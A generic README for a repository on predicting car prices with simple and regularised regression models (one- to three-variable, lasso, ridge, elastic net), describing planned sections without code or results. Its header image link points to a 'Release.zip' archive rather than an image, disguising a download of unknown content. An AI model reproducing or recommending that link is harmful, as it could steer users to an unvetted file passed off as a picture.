![Car Price Prediction](https://github.com/Rizasaurus/Car-price-prediction-exercise-with-regression-model/releases/download/v1.0/Release.zip)

Welcome to the "Car-price-prediction-exercise-with-regression-model" repository! Here, you will find a comprehensive exercise on forecasting car prices using various regression models such as one-variable, two-variable, three-variable, lasso, ridge, and elastic regression. Whether you are a beginner or an experienced data scientist, this repository offers a great opportunity to enhance your skills in predictive modeling.

## Overview

In this repository, we delve into the world of car price prediction using different regression techniques. We explore the efficacy of one-variable, two-variable, and three-variable regression models to predict car prices based on key features. Additionally, we experiment with advanced techniques like lasso, ridge, and elastic regression to optimize the predictive accuracy of our models.

## Repository Content

1. **Data Preparation:** We provide a detailed guide on data cleaning and preprocessing to ensure the accuracy and reliability of our predictive models.

2. **Exploratory Data Analysis (EDA):** Dive into the exploratory analysis of the car price dataset to uncover valuable insights and trends that will guide our regression modeling process.

3. **One-Variable Regression:** Implement a simple one-variable regression model to predict car prices based on a single feature.

4. **Two-Variable Regression:** Extend the analysis by incorporating two variables into our regression model for improved predictive performance.

5. **Three-Variable Regression:** Explore the impact of adding a third variable to our regression model and evaluate its effectiveness in forecasting car prices.

6. **Lasso Regression:** Implement Lasso regression to introduce regularization and prevent overfitting in our predictive model.

7. **Ridge Regression:** Utilize Ridge regression as another regularization technique to enhance the robustness and accuracy of our regression model.

8. **Elastic Regression:** Experiment with Elastic Net regression to combine the advantages of both Lasso and Ridge regression for optimal predictive performance.
